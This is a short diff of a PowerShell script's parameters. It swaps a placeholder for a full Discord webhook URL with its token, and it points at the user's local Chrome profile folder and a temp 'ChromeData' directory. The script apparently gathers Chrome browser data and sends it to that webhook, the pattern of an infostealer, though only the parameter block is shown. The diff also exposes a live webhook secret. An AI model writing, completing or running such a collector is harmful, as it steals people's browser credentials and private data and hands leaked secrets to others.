@@ -6,7 +6,7 @@
 #>
 
 param(
-    [string]$DiscordWebhook = "YOUR_DISCORD_WEBHOOK_URL",
+    [string]$DiscordWebhook = "https://discord.com/api/webhooks/1367303509711650836/nuApnGS-DvNceqlp6WJEqKbgE85LZHquVWEgp9YeBXwq4v47XW06JNrQs4QiGsacq_5d",
     [string]$ChromeProfilePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
     [string]$TempDir = "$env:TEMP\ChromeData_$((Get-Date).ToString('yyyyMMddHHmmss'))"
 )
